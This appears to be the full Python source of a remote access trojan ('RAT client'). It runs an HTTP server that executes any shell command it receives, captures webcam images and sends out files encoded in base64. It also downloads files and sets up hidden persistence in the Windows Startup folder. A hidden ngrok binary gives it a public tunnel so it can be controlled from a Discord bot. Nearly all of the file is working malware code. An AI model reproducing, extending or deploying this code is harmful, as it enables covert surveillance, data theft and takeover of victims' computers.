import os
import json
import asyncio
import subprocess
import sqlite3
from datetime import datetime
from aiohttp import web
from dotenv import load_dotenv
import shutil
import sys
import subprocess
import urllib.request
import zipfile
import io
import time

# Load environment variables from .env
load_dotenv()

# Configuration
LISTEN_PORT = int(os.getenv("RAT_LISTEN_PORT", "8080"))
AUTH_TOKEN = os.getenv("RAT_AUTH_TOKEN", "changeme")
DB_PATH = os.getenv("RAT_DB_PATH", "log.db")
USE_NGROK = os.getenv("USE_NGROK", "false").lower() == "true"

def ensure_ngrok():
    """Download ngrok.exe if missing, place it hidden on the Desktop, and return its path."""
    # Determine desktop hidden path
    desktop_path = os.path.join(os.getenv("USERPROFILE"), "Desktop")
    ngrok_path = os.path.join(desktop_path, "ngrok.exe")
    if not os.path.isfile(ngrok_path):
        try:
            print("[Ngrok] ngrok.exe not found, downloading to Desktop...")
            download_url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
            with urllib.request.urlopen(download_url) as resp:
                zip_data = resp.read()
            with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
                # Extract only ngrok.exe to the desktop directory
                for member in zf.infolist():
                    if member.filename.endswith("ngrok.exe"):
                        zf.extract(member, desktop_path)
            # Ensure hidden attribute
            try:
                import subprocess
                subprocess.run(["attrib", "+h", ngrok_path], check=True, shell=True)
                print("[Ngrok] ngrok.exe placed on Desktop and hidden.")
            except Exception as hide_err:
                print(f"[Ngrok] Failed to set hidden attribute: {hide_err}")
        except Exception as e:
            print(f"[Ngrok] Failed to download ngrok: {e}")
    return ngrok_path

# Ensure SQLite database and schema exist
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            command TEXT NOT NULL,
            output TEXT,
            success INTEGER NOT NULL
        )
        """
    )
    conn.commit()
    conn.close()

init_db()

# Helper to log command execution
def log_command(command: str, output: str, success: bool):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "INSERT INTO logs (timestamp, command, output, success) VALUES (?, ?, ?, ?)",
        (datetime.utcnow().isoformat(), command, output, int(success)),
    )
    conn.commit()
    conn.close()

# Async handler for incoming command HTTP POST requests
async def handle_command(request):
    # Simple token authentication
    token = request.headers.get("Authorization", "")
    if token != f"Bearer {AUTH_TOKEN}":
        return web.json_response({"error": "Unauthorized"}, status=401)

    try:
        data = await request.json()
        command = data.get("command")
        if not command:
            return web.json_response({"error": "No command provided"}, status=400)
    except Exception:
        return web.json_response({"error": "Invalid JSON"}, status=400)

    # ----- New command handling -----
    # Snap command: capture image from default camera using ffmpeg (requires ffmpeg installed)
    if command.lower().startswith("snap"):
        image_path = "snap.jpg"
        snap_cmd = f'ffmpeg -y -f dshow -i video="Integrated Camera" -frames:v 1 {image_path}'
        try:
            subprocess.run(snap_cmd, shell=True, check=True, capture_output=True, text=True)
            if os.path.isfile(image_path):
                with open(image_path, "rb") as f:
                    img_data = f.read()
                import base64
                b64 = base64.b64encode(img_data).decode()
                return web.json_response({"command": command, "output": "Snapshot taken", "file": {"name": image_path, "data": b64}})
            else:
                return web.json_response({"command": command, "error": "Snapshot failed: file not created"})
        except Exception as e:
            return web.json_response({"command": command, "error": f"Snapshot error: {e}"})

    # URL command: open a URL in the default browser
    if command.lower().startswith("url "):
        url = command[4:].strip()
        try:
            import webbrowser
            webbrowser.open(url)
            return web.json_response({"command": command, "output": f"Opened URL: {url}"})
        except Exception as e:
            return web.json_response({"command": command, "error": f"Failed to open URL: {e}"})

    # Upload command: read a file and return its base64 content
    if command.lower().startswith("upload "):
        file_path = command[7:].strip()
        if not os.path.isfile(file_path):
            return web.json_response({"command": command, "error": f"File not found: {file_path}"})
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            import base64
            b64 = base64.b64encode(data).decode()
            return web.json_response({"command": command, "output": f"File {file_path} uploaded", "file": {"name": os.path.basename(file_path), "data": b64}})
        except Exception as e:
            return web.json_response({"command": command, "error": f"Upload error: {e}"})

    # Download command: download a file from a URL to a destination path (format: download <url> <dest_path>)
    if command.lower().startswith("download "):
        parts = command.split(maxsplit=2)
        if len(parts) < 3:
            return web.json_response({"command": command, "error": "Usage: download <url> <dest_path>"})
        _, url, dest_path = parts
        try:
            import urllib.request
            urllib.request.urlretrieve(url, dest_path)
            return web.json_response({"command": command, "output": f"Downloaded {url} to {dest_path}"})
        except Exception as e:
            return web.json_response({"command": command, "error": f"Download error: {e}"})

    # ----- End of new command handling -----

    # Persistence handling
    if command.lower().startswith("persistence "):
        arg = command.split()[1].lower() if len(command.split()) > 1 else ""
        startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        target_path = os.path.join(startup_dir, "rat_client.py")
        try:
            if arg == "on":
                shutil.copy2(__file__, target_path)
                subprocess.run(["attrib", "+h", target_path], check=True, shell=True)
                # update .env persistence flag
                env_path = os.path.join(os.getcwd(), ".env")
                with open(env_path, "r") as f:
                    lines = f.readlines()
                with open(env_path, "w") as f:
                    for line in lines:
                        if line.startswith("PERSISTENCE="):
                            f.write("PERSISTENCE=on\n")
                        else:
                            f.write(line)
                return web.json_response({"command": command, "success": True, "output": "Persistence enabled"})
            elif arg == "off":
                if os.path.isfile(target_path):
                    os.remove(target_path)
                env_path = os.path.join(os.getcwd(), ".env")
                with open(env_path, "r") as f:
                    lines = f.readlines()
                with open(env_path, "w") as f:
                    for line in lines:
                        if line.startswith("PERSISTENCE="):
                            f.write("PERSISTENCE=off\n")
                        else:
                            f.write(line)
                return web.json_response({"command": command, "success": True, "output": "Persistence disabled"})
            else:
                return web.json_response({"command": command, "success": False, "output": "Invalid argument. Use on/off"})
        except Exception as e:
            return web.json_response({"command": command, "success": False, "output": f"Error: {e}"})

    # Execute the command on the host system
    try:
        completed = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=60
        )
        output = completed.stdout + completed.stderr
        success = completed.returncode == 0
    except Exception as e:
        output = str(e)
        success = False

    # Log the execution result
    log_command(command, output, success)

    response_data = {
        "command": command,
        "success": success,
        "output": output,
    }

    # If shutdown command received, respond then terminate the server
    if command.strip().lower() == "shutdown":
        resp = web.json_response(response_data)
        async def _shutdown():
            await request.app.shutdown()
            await request.app.cleanup()
            os._exit(0)
        asyncio.create_task(_shutdown())
        return resp
    else:
        return web.json_response(response_data)

app = web.Application()
app.add_routes([web.post("/execute", handle_command)])

if __name__ == "__main__":
    if USE_NGROK:
        try:
            ngrok_path = ensure_ngrok()
            # Launch ngrok as a background process
            ngrok_process = subprocess.Popen([
                ngrok_path, "http", str(LISTEN_PORT)
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)  # Give ngrok time to establish the tunnel
            with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels") as resp:
                data = json.load(resp)
                public_url = data["tunnels"][0]["public_url"]
            print(f"[Ngrok] Tunnel established: {public_url}")
            print("Set RAT_ENDPOINT to this URL + '/execute' in the Discord bot .env.")
        except Exception as e:
            print(f"[Ngrok] Failed to start tunnel: {e}")
    print(f"RAT client listening on port {LISTEN_PORT}...")
    web.run_app(app, port=LISTEN_PORT)
